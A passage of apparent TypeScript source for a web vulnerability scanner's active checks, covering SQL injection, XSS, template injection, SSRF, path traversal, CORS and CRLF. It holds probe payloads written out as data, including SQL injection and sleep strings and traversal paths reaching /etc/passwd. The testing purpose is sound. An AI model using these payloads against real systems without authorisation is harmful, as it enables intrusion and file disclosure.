/**
 * The active checks.
 *
 * Each one is written to answer a question with evidence rather than to fire
 * a list of payloads and grep for strings. The shape is almost always: send a
 * marker, see what came back, and only then send something shaped like the
 * bug. That ordering matters -- it means a parameter that does not reach the
 * response costs one request instead of forty, and it means the finding can
 * say *why* it believes the thing it believes.
 *
 * None of these attempts exploitation. The template check evaluates
 * arithmetic, the traversal check asks for a file every system has, the SSRF
 * check causes a DNS lookup. Nothing writes, deletes, or runs a command.
 */

import { type HeaderList, get as getHeader, set as setHeader } from '../../core/headers.js';
import { bodyText } from '../../core/encoding.js';
import { contentType } from '../../core/message.js';
import { classifyContext, findReflections, diffResponses, similarity } from '../../replay/diff.js';
import { canary } from '../../fuzz/payloads.js';
import {
  type ActiveCheck,
  type ActiveFinding,
  type InjectionPoint,
  type TimingSample,
  inject,
  judgeTiming,
} from './runner.js';

/** Characters that decide whether a reflection is exploitable, by context. */
const BREAKOUT_CHARS: readonly string[] = ["'", '"', '<', '>'];

/**
 * Build a payload that can tell which characters survived.
 *
 * The obvious payload -- `MARKER'"<>MARKER` -- does not work, and the way it
 * fails is instructive. Testing for `MARKER<` in the response matches the
 * trailing marker followed by the page's own next tag, so a perfectly escaped
 * reflection inside `<p>...</p>` reports `<` as surviving. Every character
 * therefore gets its own tag, and the payload ends with a sentinel so that
 * the last tag is never adjacent to the surrounding document.
 */
function breakoutPayload(marker: string): string {
  return BREAKOUT_CHARS.map((ch, i) => `${marker}${i}${ch}`).join('') + `${marker}z`;
}

function survivingChars(marker: string, text: string): string[] {
  return BREAKOUT_CHARS.filter((ch, i) => text.includes(`${marker}${i}${ch}`));
}

export const reflectionCheck: ActiveCheck = {
  id: 'AWB-A001',
  title: 'Input reflected into the response',
  description:
    'Finds parameters whose value reaches the response, reports the context it landed ' +
    'in, and establishes which of the characters that would matter there survive.',
  costPerPoint: 2,
  async run(request, points, context) {
    const out: ActiveFinding[] = [];

    for (const point of points) {
      const marker = canary(`${point.kind}${point.name}`);
      const probe = await context.sender.send(inject(request, point, marker), this.id);
      if (probe.response === undefined) continue;

      const reflections = findReflections(probe.response, marker, 5);
      if (reflections.length === 0) continue;

      // It is reflected. Now find out what survives, which is the part that
      // decides whether this is a finding or a note.
      const second = await context.sender.send(
        inject(request, point, breakoutPayload(marker)),
        this.id,
      );
      const text = second.response === undefined ? '' : bodyText(second.response.headers, second.response.body);
      const survived = survivingChars(marker, text);

      const bodyReflection = reflections.find((r) => r.where === 'body');
      const htmlContext =
        bodyReflection === undefined ? 'unknown' : classifyContext(bodyReflection.context, marker);

      const dangerous = contextNeeds(htmlContext).filter((ch) => survived.includes(ch));
      const exploitable = dangerous.length > 0;

      out.push({
        check: this.id,
        title: exploitable
          ? `Unescaped reflection of ${point.label} in ${htmlContext} context`
          : `Reflection of ${point.label} in ${htmlContext} context, escaped`,
        severity: exploitable ? (htmlContext === 'script' || htmlContext === 'url' ? 'high' : 'medium') : 'info',
        confidence: exploitable ? 'firm' : 'certain',
        detail:
          `A marker placed in ${point.label} came back in the response` +
          (bodyReflection?.offset === undefined ? '' : ` at body offset ${bodyReflection.offset}`) +
          `, in ${htmlContext} context. Surrounding text: ` +
          `${JSON.stringify((bodyReflection?.context ?? '').slice(0, 160))}.\n\n` +
          (survived.length === 0
            ? 'None of the characters that would matter there survived, so the output encoding ' +
              'is doing its job. Recorded because the reflection itself is worth knowing about: ' +
              'a later change to the encoding makes this exploitable.'
            : `These characters survived unencoded: ${survived.map((c) => JSON.stringify(c)).join(', ')}. ` +
              (exploitable
                ? `In ${htmlContext} context, ${dangerous.map((c) => JSON.stringify(c)).join(' and ')} ` +
                  'is sufficient to break out of the surrounding construct.'
                : `None of them is sufficient to break out of ${htmlContext} context, so this is ` +
                  'reported for completeness rather than as an injection.')) +
          `\n\nMarker used: ${marker}. Reproduce with \`awb replay <id> --set ` +
          `${pointSyntax(point)}=${marker}\`.`,
        remediation:
          'Encode on output, for the context the value lands in -- HTML entity encoding for ' +
          'text, attribute encoding inside attributes, JavaScript string encoding inside a ' +
          'script, and for a URL context a scheme allow-list rather than encoding.',
        url: request.url,
        evidence: [probe.exchange.id, second.exchange.id],
      });
    }

    return out;
  },
};

/** Which characters actually matter in which context. */
function contextNeeds(context: string): string[] {
  switch (context) {
    case 'html-text':
      return ['<'];
    case 'attribute-double':
      return ['"'];
    case 'attribute-single':
      return ["'"];
    case 'attribute-unquoted':
      return ['<', '"', "'"];
    case 'script':
      return ['"', "'", '<'];
    case 'url':
      return ["'", '"'];
    case 'comment':
      return ['<', '>'];
    default:
      return ['<'];
  }
}

function pointSyntax(point: InjectionPoint): string {
  switch (point.kind) {
    case 'query':
      return `query:${point.name}`;
    case 'form':
      return `form:${point.name}`;
    case 'json':
      return `json:${point.name}`;
    case 'cookie':
      return `cookie:${point.name}`;
    case 'header':
      return `header:${point.name}`;
    case 'path-segment':
      return `path (segment ${point.name})`;
    default:
      return point.label;
  }
}

export const sqlInjectionCheck: ActiveCheck = {
  id: 'AWB-A002',
  title: 'SQL injection',
  description:
    'Tests each parameter for an error message, then for a logic difference between ' +
    'two payloads that should be equivalent, which is what distinguishes injection ' +
    'from a parameter that merely changes the answer.',
  costPerPoint: 4,
  async run(request, points, context) {
    const out: ActiveFinding[] = [];

    const errorSignatures: readonly [RegExp, string][] = [
      [/SQLSTATE\[[0-9A-Z]{5}\]/, 'a PDO-based stack'],
      [/You have an error in your SQL syntax/i, 'MySQL'],
      [/Unclosed quotation mark after the character string/i, 'SQL Server'],
      [/PG::(?:Syntax|Undefined)\w*Error|unterminated quoted string/i, 'PostgreSQL'],
      [/ORA-\d{5}/, 'Oracle'],
      [/SQLiteException|unrecognized token/i, 'SQLite'],
      [/quoted string not properly terminated/i, 'Oracle'],
    ];

    for (const point of points) {
      const baseline = await context.sender.send(inject(request, point, point.original), this.id);
      if (baseline.response === undefined) continue;
      const baselineText = bodyText(baseline.response.headers, baseline.response.body);

      // 1. A single quote. An error message is the cheapest confirmation.
      const quoted = await context.sender.send(inject(request, point, `${point.original}'`), this.id);
      if (quoted.response !== undefined) {
        const text = bodyText(quoted.response.headers, quoted.response.body);
        for (const [pattern, engine] of errorSignatures) {
          const match = pattern.exec(text);
          if (match === null) continue;
          if (pattern.test(baselineText)) break; // the error was already there
          out.push({
            check: this.id,
            title: `SQL injection in ${point.label} (${engine} error)`,
            severity: 'critical',
            confidence: 'firm',
            detail:
              `Appending a single quote to ${point.label} produced a ${engine} error that the ` +
              `unmodified request did not: ${JSON.stringify(text.slice(Math.max(0, match.index - 40), match.index + 160).replace(/\s+/g, ' '))}. ` +
              'An error means the value reached the statement unparameterised.',
            remediation:
              'Use parameterised statements. Escaping is not an adequate substitute, and ' +
              'neither is input validation -- the fix is that the value never becomes part of ' +
              'the statement text.',
            url: request.url,
            evidence: [baseline.exchange.id, quoted.exchange.id],
          });
          break;
        }
      }

      // 2. A boolean differential. Two payloads that are equivalent unless
      //    the value reaches a condition, which is the test that works on an
      //    application with error messages switched off.
      const truthy = await context.sender.send(
        inject(request, point, `${point.original}' AND '1'='1`),
        this.id,
      );
      const falsy = await context.sender.send(
        inject(request, point, `${point.original}' AND '1'='2`),
        this.id,
      );

      if (truthy.response !== undefined && falsy.response !== undefined) {
        const trueText = bodyText(truthy.response.headers, truthy.response.body);
        const falseText = bodyText(falsy.response.headers, falsy.response.body);
        const trueVsFalse = similarity(trueText, falseText);
        const trueVsBaseline = similarity(trueText, baselineText);

        // The signal: the true payload resembles the baseline and the false
        // one does not. Both differing from the baseline equally is just a
        // parameter that rejects odd input.
        const tracksLogic =
          trueVsBaseline > 0.95 &&
          trueVsFalse < 0.9 &&
          truthy.response.status === baseline.response.status;

        if (tracksLogic) {
          out.push({
            check: this.id,
            title: `SQL injection in ${point.label} (boolean differential)`,
            severity: 'critical',
            confidence: 'firm',
            detail:
              `Two payloads differing only in whether the appended condition is true produced ` +
              `different responses. The true variant resembles the unmodified response ` +
              `(similarity ${trueVsBaseline.toFixed(3)}) and the false variant does not ` +
              `(similarity ${trueVsFalse.toFixed(3)} against the true variant). The parameter ` +
              'is therefore being evaluated as part of a condition rather than as a value.',
            remediation: 'Use parameterised statements.',
            url: request.url,
            evidence: [baseline.exchange.id, truthy.exchange.id, falsy.exchange.id],
          });
        }
      }
    }

    return out;
  },
};

export const templateInjectionCheck: ActiveCheck = {
  id: 'AWB-A003',
  title: 'Server-side template injection',
  description:
    'Sends arithmetic in the syntax of the common template engines. A response ' +
    'containing the result is unambiguous evidence, and the payload changes nothing.',
  costPerPoint: 2,
  async run(request, points, context) {
    const out: ActiveFinding[] = [];

    // 7 * 104729 is chosen so the product cannot plausibly occur by accident
    // in a page, which "49" very much can.
    const left = 7;
    const right = 104_729;
    const product = String(left * right);

    const syntaxes: readonly [string, string][] = [
      [`{{${left}*${right}}}`, 'Jinja2, Twig, Nunjucks or Handlebars-style'],
      [`\${${left}*${right}}`, 'FreeMarker, JSP EL or JavaScript template literal'],
      [`#{${left}*${right}}`, 'Thymeleaf or Ruby string interpolation'],
      [`<%= ${left}*${right} %>`, 'ERB or EJS'],
      [`\${{${left}*${right}}}`, 'a nested-expression dialect'],
    ];

    for (const point of points) {
      for (const [payload, engines] of syntaxes) {
        const result = await context.sender.send(inject(request, point, payload), this.id);
        if (result.response === undefined) continue;
        const text = bodyText(result.response.headers, result.response.body);
        if (!text.includes(product)) continue;
        // Make sure it was not already there.
        if (text.includes(payload)) {
          // The payload came back verbatim as well as evaluated: unusual, but
          // the product is what matters.
        }

        out.push({
          check: this.id,
          title: `Server-side template injection in ${point.label}`,
          severity: 'critical',
          confidence: 'firm',
          detail:
            `The payload ${payload} placed in ${point.label} produced ${product} in the ` +
            `response, which is ${left} * ${right} evaluated server-side. The syntax matched ` +
            `is used by ${engines}.\n\nTemplate injection is usually a path to code execution: ` +
            'the expression language generally reaches object methods, and from there the ' +
            'runtime. That escalation is deliberately not attempted here.',
          remediation:
            'Never pass user input as a template. Pass it as a variable to a fixed template. ' +
            'Where a user-supplied template is a product requirement, use a sandboxed ' +
            'engine designed for it and treat the sandbox as a boundary that will be tested.',
          url: request.url,
          evidence: [result.exchange.id],
        });
        break; // One confirmation per point is enough.
      }
    }

    return out;
  },
};

export const openRedirectCheck: ActiveCheck = {
  id: 'AWB-A004',
  title: 'Open redirect',
  description:
    'Replaces redirect-looking parameters with an external destination and reports ' +
    'where the application followed it.',
  costPerPoint: 1,
  async run(request, points, context) {
    const out: ActiveFinding[] = [];
    const destination = 'https://awb-open-redirect.invalid/probe';

    const candidates = points.filter((p) =>
      /^(?:next|url|uri|redirect|redirect_uri|redirect_url|return|return_to|returnurl|continue|dest|destination|target|goto|callback|r|u)$/i.test(
        p.name,
      ),
    );

    for (const point of candidates) {
      const result = await context.sender.send(inject(request, point, destination), this.id);
      if (result.response === undefined) continue;
      const status = result.response.status;
      const location = getHeader(result.response.headers, 'location');

      if (status >= 300 && status < 400 && location !== undefined && location.includes('awb-open-redirect.invalid')) {
        out.push({
          check: this.id,
          title: `Open redirect in ${point.label}`,
          severity: 'medium',
          confidence: 'certain',
          detail:
            `Setting ${point.label} to an external URL produced a ${status} with ` +
            `Location: ${location}. The destination is not validated.\n\nThe usual impact is ` +
            'phishing from a trustworthy domain. Where this parameter is an OAuth redirect_uri, ' +
            'it is considerably worse: the authorisation code lands on the attacker\'s host.',
          remediation:
            'Validate the destination against an allow-list of paths, or of hosts. Rejecting ' +
            'anything that parses as an absolute URL is the simplest sufficient rule for most ' +
            'applications.',
          url: request.url,
          evidence: [result.exchange.id],
        });
        continue;
      }

      // A meta refresh or a JavaScript assignment is the same bug.
      const text = bodyText(result.response.headers, result.response.body);
      if (text.includes('awb-open-redirect.invalid') && /http-equiv=["']refresh|location\s*(?:=|\.(?:href|assign|replace))/i.test(text)) {
        out.push({
          check: this.id,
          title: `Client-side open redirect in ${point.label}`,
          severity: 'low',
          confidence: 'firm',
          detail:
            `The destination appears in the response body alongside a meta refresh or a ` +
            'JavaScript navigation, so the redirect happens in the browser rather than through ' +
            'a Location header. The impact is the same; it is harder to spot in logs.',
          remediation: 'Validate the destination before emitting it, server-side.',
          url: request.url,
          evidence: [result.exchange.id],
        });
      }
    }

    return out;
  },
};

export const corsOriginCheck: ActiveCheck = {
  id: 'AWB-A005',
  title: 'CORS policy reflects an arbitrary origin',
  description:
    'Sends an Origin the application has never seen. A policy that echoes it is not ' +
    'checking against a list, which the passive check can only suspect.',
  costPerPoint: 2,
  async run(request, _points, context) {
    const probe = 'https://awb-cors-probe.invalid';
    const withOrigin = setHeader(request.headers, 'Origin', probe);
    const result = await context.sender.send({ ...request, headers: withOrigin }, this.id);
    if (result.response === undefined) return [];

    const allow = getHeader(result.response.headers, 'access-control-allow-origin');
    const credentials =
      (getHeader(result.response.headers, 'access-control-allow-credentials') ?? '')
        .toLowerCase()
        .trim() === 'true';

    // Rejecting the probe outright is the correct behaviour and is also where
    // the interesting bug lives: a check written with startsWith or endsWith
    // rejects an unrelated origin and accepts a crafted one. So the crafted
    // shapes are tried whether the probe was echoed or merely refused.
    if (allow === undefined || allow.trim().toLowerCase() !== probe) {
      // Try the suffix and prefix shapes, which a sloppy `startsWith` check
      // lets through and a list does not.
      let host: string;
      try {
        host = new URL(request.url).hostname;
      } catch {
        return [];
      }
      const tricks: readonly [string, string][] = [
        [`https://${host}.awb-cors-probe.invalid`, 'a suffix match: the allowed host is a prefix of the attacker\'s'],
        [`https://awb-cors-probe-${host}`, 'a prefix match: the allowed host is a suffix of the attacker\'s'],
      ];
      for (const [origin, mechanism] of tricks) {
        const attempt = await context.sender.send(
          { ...request, headers: setHeader(request.headers, 'Origin', origin) },
          this.id,
        );
        const echoed = attempt.response === undefined
          ? undefined
          : getHeader(attempt.response.headers, 'access-control-allow-origin');
        if (echoed !== undefined && echoed.trim().toLowerCase() === origin.toLowerCase()) {
          const craftedCredentials =
            attempt.response !== undefined &&
            (getHeader(attempt.response.headers, 'access-control-allow-credentials') ?? '')
              .toLowerCase()
              .trim() === 'true';
          return [
            {
              check: this.id,
              title: 'CORS origin check can be defeated by a crafted hostname',
              severity: craftedCredentials ? 'high' : 'medium',
              confidence: 'certain',
              detail:
                `The application rejected ${probe} but echoed ${origin}, which indicates ` +
                `${mechanism}. An attacker only has to register a hostname of that shape.` +
                (craftedCredentials
                  ? ' Credentials are allowed for the crafted origin, so the read includes the session.'
                  : ''),
              remediation:
                'Compare the Origin header for equality against entries in a list. Never use ' +
                'startsWith, endsWith, includes, or a regular expression without anchors.',
              url: request.url,
              evidence: [result.exchange.id, attempt.exchange.id],
            },
          ];
        }
      }
      return [];
    }

    return [
      {
        check: this.id,
        title: credentials
          ? 'CORS reflects any origin and allows credentials'
          : 'CORS reflects any origin',
        severity: credentials ? 'critical' : 'medium',
        confidence: 'certain',
        detail:
          `An Origin header of ${probe} -- a hostname in the reserved .invalid TLD, which the ` +
          'application cannot have allow-listed -- was echoed back in ' +
          `Access-Control-Allow-Origin. The reflection is therefore unconditional.` +
          (credentials
            ? ' Access-Control-Allow-Credentials is true, so a page on any origin can read ' +
              'this response with the victim\'s cookies attached. That is a full cross-origin ' +
              'read of authenticated content.'
            : ' Credentials are not allowed, so what is exposed is what an unauthenticated ' +
              'request returns.'),
        remediation:
          'Compare Origin against an allow-list and echo only a value from it. Add Origin to ' +
          'Vary so a cache cannot serve one origin the answer computed for another.',
        url: request.url,
        evidence: [result.exchange.id],
      },
    ];
  },
};

export const pathTraversalCheck: ActiveCheck = {
  id: 'AWB-A006',
  title: 'Path traversal',
  description:
    'Asks path-like parameters for a file that exists on every system, in several ' +
    'encodings, because a filter that decodes once and a resolver that decodes twice ' +
    'disagree.',
  costPerPoint: 3,
  async run(request, points, context) {
    const out: ActiveFinding[] = [];

    const payloads: readonly string[] = [
      '../../../../../../etc/passwd',
      '..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
      '....//....//....//....//....//....//etc/passwd',
    ];

    // Signatures of the two files asked for. Both are distinctive enough that
    // a match is not a coincidence.
    const signatures: readonly [RegExp, string][] = [
      [/root:[x*!]?:0:0:/, '/etc/passwd'],
      [/\[(?:fonts|extensions)\]/i, 'C:\\Windows\\win.ini'],
    ];

    const candidates = points.filter(
      (p) =>
        p.kind === 'path-segment' ||
        /file|path|name|template|page|doc|document|download|attachment|include|view|img|image|src|dir|folder/i.test(
          p.name,
        ) ||
        /\.\w{2,5}$/.test(p.original),
    );

    for (const point of candidates) {
      for (const payload of payloads) {
        const result = await context.sender.send(inject(request, point, payload), this.id);
        if (result.response === undefined) continue;
        const text = bodyText(result.response.headers, result.response.body);
        const hit = signatures.find(([pattern]) => pattern.test(text));
        if (hit === undefined) continue;

        out.push({
          check: this.id,
          title: `Path traversal in ${point.label}`,
          severity: 'critical',
          confidence: 'certain',
          detail:
            `Setting ${point.label} to ${JSON.stringify(payload)} returned content matching ` +
            `${hit[1]}. The parameter is resolved against the filesystem without being ` +
            'confined to a directory.' +
            (payload.includes('%2f')
              ? ' The successful payload was percent-encoded, which means something decodes ' +
                'after the check that was supposed to stop this.'
              : ''),
          remediation:
            'Resolve the path and then verify the result is inside the intended directory, ' +
            'after all decoding. Rejecting ".." is not sufficient: there are too many ways to ' +
            'write it. Better still, never accept a path -- accept an identifier and map it to ' +
            'a filename server-side.',
          url: request.url,
          evidence: [result.exchange.id],
        });
        break;
      }
    }

    return out;
  },
};

export const ssrfCheck: ActiveCheck = {
  id: 'AWB-A007',
  title: 'Server-side request forgery',
  description:
    'Puts a unique hostname the workbench controls into URL-shaped parameters and ' +
    'watches its own listener. A DNS lookup or an HTTP request proves the server fetched ' +
    'it, which is the only evidence a blind forgery produces.',
  costPerPoint: 1,
  needsOob: true,
  async run(request, points, context) {
    const listener = context.oob;
    if (listener === undefined) return [];

    const out: ActiveFinding[] = [];
    const candidates = points.filter(
      (p) =>
        /url|uri|link|src|source|target|dest|destination|callback|webhook|endpoint|host|domain|feed|image|avatar|proxy|fetch|load|import|redirect/i.test(
          p.name,
        ) || /^https?:\/\//i.test(p.original),
    );

    const pending: { point: InjectionPoint; token: string; exchangeId: string }[] = [];

    for (const point of candidates) {
      const mark = listener.mint(`SSRF probe via ${point.label}`);
      const result = await context.sender.send(inject(request, point, mark.url), this.id);
      pending.push({ point, token: mark.token, exchangeId: result.exchange.id });
    }

    // Wait once for all of them rather than serially: a server-side fetch is
    // often asynchronous and arrives seconds after the response.
    if (pending.length > 0) await sleep(6000);

    for (const entry of pending) {
      const interactions = listener.forToken(entry.token);
      if (interactions.length === 0) continue;

      const kinds = [...new Set(interactions.map((i) => i.kind))];
      const fetched = kinds.includes('http');

      out.push({
        check: this.id,
        title: fetched
          ? `Server-side request forgery in ${entry.point.label} (full request)`
          : `Server-side request forgery in ${entry.point.label} (DNS only)`,
        severity: fetched ? 'high' : 'medium',
        confidence: 'certain',
        detail:
          `A unique hostname was placed in ${entry.point.label} and the workbench's own ` +
          `listener recorded ${interactions.length} interaction(s) for it: ` +
          `${interactions.map((i) => `${i.kind} ${i.detail} from ${i.remoteAddress}`).join('; ')}.` +
          (fetched
            ? ' A full HTTP request arrived, so the server fetches URLs supplied in this ' +
              'parameter. Where it can reach, and what it does with the response, decide the ' +
              'impact -- cloud instance metadata and internal admin interfaces are the usual ' +
              'targets.'
            : ' Only a DNS lookup arrived. That still proves the value is resolved server-side, ' +
              'which is enough for DNS-based exfiltration, but the fetch may be blocked by ' +
              'egress filtering. Worth confirming against an internal address.') +
          `\n\nThe source address of the interaction is worth noting: it is the egress address ` +
          'of whatever made the request, which is frequently not the application server.',
        remediation:
          'Do not fetch user-supplied URLs. Where the product requires it, resolve the ' +
          'hostname first, check the resulting address against a deny-list of private and ' +
          'link-local ranges, and connect to that address rather than re-resolving the name -- ' +
          'otherwise the name can resolve differently for the check and for the request.',
        url: request.url,
        evidence: [entry.exchangeId],
      });
    }

    return out;
  },
};

export const hostHeaderCheck: ActiveCheck = {
  id: 'AWB-A008',
  title: 'Host header is reflected or trusted',
  description:
    'Replaces the Host header and the headers a reverse proxy may trust, and reports ' +
    'where the value reaches a link, a redirect, or a cache key.',
  costPerPoint: 3,
  async run(request, _points, context) {
    const out: ActiveFinding[] = [];
    const marker = 'awb-host-probe.invalid';

    const baseline = await context.sender.send(request, this.id);
    if (baseline.response === undefined) return [];

    const attempts: readonly [string, string][] = [
      ['Host', marker],
      ['X-Forwarded-Host', marker],
      ['X-Original-URL', `http://${marker}/`],
    ];

    for (const [header, value] of attempts) {
      const result = await context.sender.send(
        { ...request, headers: setHeader(request.headers, header, value) },
        this.id,
      );
      if (result.response === undefined) continue;

      const location = getHeader(result.response.headers, 'location') ?? '';
      const text = bodyText(result.response.headers, result.response.body);
      const inLocation = location.includes(marker);
      const inBody = text.includes(marker);
      if (!inLocation && !inBody) continue;

      const cacheable = /max-age|public|s-maxage/i.test(
        getHeader(result.response.headers, 'cache-control') ?? '',
      );

      out.push({
        check: this.id,
        title: inLocation
          ? `${header} controls the redirect destination`
          : `${header} is reflected into the response body`,
        severity: cacheable ? 'high' : 'medium',
        confidence: 'certain',
        detail:
          `Sending ${header}: ${value} produced a response containing that host ` +
          (inLocation ? `in the Location header (${location})` : 'in the body') +
          `. The application builds absolute URLs from a header the client controls.\n\n` +
          (cacheable
            ? 'The response is cacheable, which makes this a cache poisoning primitive: one ' +
              'request with a poisoned header can be served to every subsequent visitor.'
            : 'The response is not obviously cacheable, which limits this to the requester -- ' +
              'still enough for password-reset poisoning, where the link is emailed to the victim.'),
        remediation:
          'Build absolute URLs from configuration, not from the request. Where a reverse proxy ' +
          'legitimately supplies the host, validate it against an allow-list at the edge and ' +
          'strip the header from anything arriving from outside.',
        url: request.url,
        evidence: [baseline.exchange.id, result.exchange.id],
      });
    }

    return out;
  },
};

export const methodTamperingCheck: ActiveCheck = {
  id: 'AWB-A009',
  title: 'Authorisation differs by HTTP method',
  description:
    'Repeats the request with other methods. A route authorised for one method and ' +
    'reachable by another means the check is on the route rather than on the action.',
  costPerPoint: 4,
  async run(request, _points, context) {
    const out: ActiveFinding[] = [];
    const original = request.method.toUpperCase();
    const baseline = await context.sender.send(request, this.id);
    if (baseline.response === undefined) return [];

    const alternatives = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS'].filter(
      (m) => m !== original,
    );

    // Only interesting if the original was refused: the question is whether
    // another method gets through where this one did not.
    const refused = baseline.response.status === 401 || baseline.response.status === 403;
    if (!refused) {
      // The other direction: a safe method reaching a state-changing route.
      if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(original)) {
        const asGet = await context.sender.send({ ...request, method: 'GET' }, this.id);
        if (
          asGet.response !== undefined &&
          asGet.response.status >= 200 &&
          asGet.response.status < 300
        ) {
          out.push({
            check: this.id,
            title: `A state-changing route also answers GET`,
            severity: 'medium',
            confidence: 'firm',
            detail:
              `The request was a ${original} and the same URL returns ` +
              `${asGet.response.status} for GET. If the GET performs the action, it can be ` +
              'triggered by a link or an image tag, which defeats any CSRF defence that relies ' +
              'on the request having a body. Confirm whether the GET actually changes state ' +
              'before reporting this.',
            remediation:
              'Route state-changing actions to the methods that declare them, and reject the ' +
              'others with 405.',
            url: request.url,
            evidence: [baseline.exchange.id, asGet.exchange.id],
          });
        }
      }
      return out;
    }

    for (const method of alternatives.slice(0, 4)) {
      const result = await context.sender.send({ ...request, method }, this.id);
      if (result.response === undefined) continue;
      if (result.response.status >= 200 && result.response.status < 300) {
        out.push({
          check: this.id,
          title: `${original} is refused but ${method} is allowed`,
          severity: 'high',
          confidence: 'firm',
          detail:
            `The original ${original} request returned ${baseline.response.status} and the ` +
            `same URL with ${method} returned ${result.response.status} with ` +
            `${result.response.body.length} bytes. The authorisation decision is being made ` +
            'per method rather than per action, which usually means a declarative rule ' +
            `listing methods rather than a check inside the handler.`,
          remediation:
            'Authorise the action, in the handler, regardless of the method that reached it. ' +
            'Method-based rules in a configuration file are a deny-list and will be incomplete.',
          url: request.url,
          evidence: [baseline.exchange.id, result.exchange.id],
        });
        break;
      }
    }

    return out;
  },
};

export const authorisationDifferentialCheck: ActiveCheck = {
  id: 'AWB-A010',
  title: 'Object reachable by another session',
  description:
    'Replays the request with a second session\'s credentials. A response that still ' +
    'contains the first session\'s data is a broken object-level authorisation.',
  costPerPoint: 2,
  async run(request, _points, context) {
    const second = context.secondSession;
    if (second === undefined || second.length === 0) return [];

    const baseline = await context.sender.send(request, this.id);
    if (baseline.response === undefined) return [];
    if (baseline.response.status < 200 || baseline.response.status >= 300) return [];

    let swapped: HeaderList = request.headers.filter(
      ([k]) => !['cookie', 'authorization', 'x-api-key'].includes(k.toLowerCase()),
    );
    for (const [name, value] of second) swapped = setHeader(swapped, name, value);

    const other = await context.sender.send({ ...request, headers: swapped }, this.id);
    if (other.response === undefined) return [];

    // Refused is the correct outcome.
    if (other.response.status === 401 || other.response.status === 403 || other.response.status === 404) {
      return [];
    }

    const diff = diffResponses(baseline.response, other.response);
    if (diff.similarity < 0.9) {
      // Different content for a different user is normal and correct.
      return [];
    }

    return [
      {
        check: this.id,
        title: 'The same object is returned to a second session',
        severity: 'high',
        confidence: 'firm',
        detail:
          `The request was replayed with the second session's credentials and returned ` +
          `${other.response.status} with content ${(diff.similarity * 100).toFixed(1)}% similar ` +
          'to the first session\'s response. Two different users receiving the same object ' +
          'means the identifier in this request is the only thing deciding what is returned.\n\n' +
          'Verify by eye before reporting: if this endpoint legitimately returns the same ' +
          'public content to everyone, the similarity is expected and this is a false positive.',
        remediation:
          'Authorise the object, not the route: check that the authenticated principal is ' +
          'entitled to the specific record, inside the handler that loads it.',
        url: request.url,
        evidence: [baseline.exchange.id, other.exchange.id],
      },
    ];
  },
};

export const timeBasedInjectionCheck: ActiveCheck = {
  id: 'AWB-A011',
  title: 'Time-based injection',
  description:
    'For parameters that show no error and no content difference, measures whether a ' +
    'sleep payload makes the response slower than the baseline\'s own variance can explain.',
  costPerPoint: 8,
  async run(request, points, context) {
    const out: ActiveFinding[] = [];
    const delaySeconds = 5;

    // Only worth the requests on a parameter that looks like it reaches data.
    const candidates = points
      .filter((p) => /id$|^id|user|account|order|product|search|q$|query|filter|sort|name|email/i.test(p.name))
      .slice(0, 3);

    for (const point of candidates) {
      if (context.sender.requestsLeft < this.costPerPoint) break;

      const baselineSamples: TimingSample[] = [];
      for (let i = 0; i < 4; i += 1) {
        const r = await context.sender.send(inject(request, point, point.original), this.id);
        baselineSamples.push({
          elapsedMs: r.response?.elapsedMs ?? 0,
          status: r.response?.status,
        });
      }

      const payloads: readonly [string, string][] = [
        [`${point.original}' AND SLEEP(${delaySeconds})-- `, 'MySQL'],
        [`${point.original}'; SELECT pg_sleep(${delaySeconds})-- `, 'PostgreSQL'],
      ];

      for (const [payload, engine] of payloads) {
        if (context.sender.requestsLeft < 3) break;
        const testSamples: TimingSample[] = [];
        let lastExchange = '';
        for (let i = 0; i < 3; i += 1) {
          const r = await context.sender.send(inject(request, point, payload), this.id);
          testSamples.push({ elapsedMs: r.response?.elapsedMs ?? 0, status: r.response?.status });
          lastExchange = r.exchange.id;
        }

        const verdict = judgeTiming(baselineSamples, testSamples, delaySeconds * 1000);
        if (!verdict.delayed) continue;

        out.push({
          check: this.id,
          title: `Time-based SQL injection in ${point.label} (${engine} syntax)`,
          severity: 'critical',
          confidence: 'firm',
          detail:
            `A ${engine} sleep payload in ${point.label} delayed the response reproducibly. ` +
            `${verdict.reason}.\n\nThe measurement was four baseline requests and three test ` +
            'requests; every test request was slow. A timing conclusion from a single sample ' +
            'would not be worth stating, and this one is deliberately conservative.',
          remediation: 'Use parameterised statements.',
          url: request.url,
          evidence: [lastExchange],
        });
        break;
      }
    }

    return out;
  },
};

export const crlfInjectionCheck: ActiveCheck = {
  id: 'AWB-A012',
  title: 'CRLF injection into a response header',
  description:
    'Puts a carriage return and line feed followed by a marker header into reflected ' +
    'parameters, and confirms by parsing the response: the finding is a header the ' +
    'server did not set, not a string in the body.',
  costPerPoint: 3,
  async run(request, points, context) {
    const out: ActiveFinding[] = [];
    const marker = canary('crlf');
    const injectedName = `x-awb-${marker}`.toLowerCase();

    // The payload a value gets, in two encodings. A filter that strips a raw
    // newline but not an encoded one, in front of a server that decodes, is
    // the whole bug -- so which encoding works is worth recording.
    const encodings: readonly [string, string][] = [
      ['raw', `\r\n${injectedName}: ${marker}`],
      ['percent', `%0d%0a${injectedName}:%20${marker}`],
    ];

    // A header the client can obviously set itself proves nothing; only
    // parameters whose value the server puts back into a response header are
    // interesting, so this looks at every point but judges by the response.
    for (const point of points) {
      if (point.kind === 'header') continue;
      if (context.sender.requestsLeft < 1) break;

      let found: { encoding: string; exchangeId: string; where: string } | undefined;
      for (const [encoding, payload] of encodings) {
        if (context.sender.requestsLeft < 1) break;
        const probe = await context.sender.send(inject(request, point, `${point.original}${payload}`), this.id);
        if (probe.response === undefined) continue;

        // The marker as a real header is the confirmation. A value that
        // merely contains the literal text is not: it has to have been parsed
        // as a header by the server for this to be exploitable.
        // A match in the body text is not enough: the marker has to have been
        // parsed by the server as its own response header, which is what the
        // injected CR and LF would cause and what a stripped value would not.
        if (getHeader(probe.response.headers, injectedName) === marker) {
          found = { encoding, exchangeId: probe.exchange.id, where: `the ${injectedName} response header` };
          break;
        }
      }
      if (found === undefined) continue;

      out.push({
        check: this.id,
        title: `CRLF injection in ${point.label}`,
        severity: 'high',
        confidence: 'certain',
        detail:
          `A CRLF sequence placed in ${point.label} (${found.encoding} encoding) produced a new ` +
          `header line in the response: ${found.where} carried the injected marker ${marker}, ` +
          'which the application does not otherwise set. The value reaches the response header ' +
          'block without the CR and LF being stripped.\n\n' +
          'This is header injection: an attacker chooses response headers. Depending on what the ' +
